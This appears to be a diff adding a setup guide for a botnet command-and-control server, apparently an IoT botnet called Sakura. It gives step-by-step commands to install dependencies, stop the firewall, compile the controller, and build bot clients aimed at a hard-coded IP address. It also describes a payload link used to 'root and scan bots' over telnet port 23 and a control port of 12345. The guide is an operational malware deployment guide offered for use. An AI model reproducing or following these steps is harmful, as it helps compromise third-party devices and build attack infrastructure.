@@ -1,0 +1,36 @@
+EVERYTHING YOU NEED:
+
+1. VPS CentOS 6.9.
+2. MobaXterm And PuTTY.
+3. Another CentOS 6.9 VPS In The Future For Scanning Bots.
+4. This Is All You Really Need.
+
+Edit the client.c file where it says "SERVERIP" to your server IP.
+
+Edit the Sakura_Login.txt file and change your username and password.
+If you want more then one user add another username and password under the first one in the Sakura_Login.txt file.
+
+Edit where it says "[SERVERIP]" below to your server IP.
+
+Drag all files into your server and run these commands...
+--------------------------------------------------------------------
+yum install python-paramiko nano screen gcc perl wget lbzip unzip -y
+
+service httpd restart
+service iptables stop
+
+gcc fearless.c -o dranksec -pthread
+
+python cc.py client.c 144.208.127.140
+
+screen ./dranksec 717 1 1336
+--------------------------------------------------------------------
+Now press ctrl-A+D   *NOTE If screen doesnt work then type "pkill screen" then try to screen again.
+
+Copy your link, it is your payload so you can root and scan bots in the future so make sure you save it somewhere safe.
+
+Bot port is 23 and CNC port is 12345.
+
+Type "screen -x" to see commands used by users and devices that have connected.
+
+Make sure to check the "Sakura_Logs.log" file that will appear in your server to see all of logs.
